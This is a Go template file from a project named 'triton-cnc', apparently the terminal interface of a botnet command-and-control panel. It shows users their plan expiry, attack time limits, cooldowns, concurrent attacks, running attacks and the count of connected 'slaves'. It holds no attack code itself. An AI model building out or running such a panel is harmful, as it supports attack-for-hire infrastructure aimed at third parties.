package template

import (
	"triton-cnc/core/models/client/term_pack"
	"triton-cnc/core/models/json/build"
	"triton-cnc/core/models/util"
	"triton-cnc/core/mysql"
	"triton-cnc/core/sessions/sessions"
	"triton-cnc/core/slaves"
	"io"
	"strconv"
	"time"
)

func Standard(Client *termfx.Registry, User *database.User, Colour bool) (*termfx.Registry) {

	lol := time.Duration(time.Until(time.Unix(User.PlanExpiry, 0))).Hours()/24



	Client.RegisterVariable("name", build.Config.AppConfig.AppName)
	Client.RegisterVariable("days_left", strconv.FormatFloat(lol, 'f', 2, 64))
	Client.RegisterVariable("admin", util.Colour(User.Administrator, Colour))
	Client.RegisterVariable("reseller", util.Colour(User.Reseller, Colour))
	Client.RegisterVariable("vip", util.Colour(User.Vip, Colour))
	Client.RegisterVariable("newuser", util.Colour(User.NewAccount, Colour))
	Client.RegisterVariable("banned", util.Colour(User.Banned, Colour))
	Client.RegisterVariable("bypassblacklist", util.Colour(User.BypassBlacklist, Colour))
	Client.RegisterVariable("powersavingexempt", util.Colour(User.PowerSavingExempt, Colour))

	Client.RegisterVariable("maxtime", strconv.Itoa(User.Maxtime))
	Client.RegisterVariable("cooldown", strconv.Itoa(User.Cooldown))
	Client.RegisterVariable("concurrents", strconv.Itoa(User.Concurrents))
	Client.RegisterVariable("maxsessions", strconv.Itoa(User.MaxSessions))

	Client.RegisterVariable("username", User.Username)
	Client.RegisterVariable("id", strconv.Itoa(User.ID))

	Running, _ := database.GetRunning()
	Client.RegisterVariable("ongoing", strconv.Itoa(Running))

	RunningUser, _ := database.GetRunningUser(User.Username)
	Client.RegisterVariable("myrunning", strconv.Itoa(RunningUser))

	Client.RegisterFunction("clear", func(session io.Writer, args string) (int, error) {

		return session.Write([]byte("\033[2J\033[;H"))
	})


	Client.RegisterFunction("slaves", func(session io.Writer, args string) (int, error) {
		return session.Write([]byte(strconv.Itoa(slaves_int.GetCount())))
	})





	Client.RegisterFunction("online", func(session io.Writer, args string) (int, error) {

		return session.Write([]byte(strconv.Itoa(sessions.Online())))
	})

	return Client
}
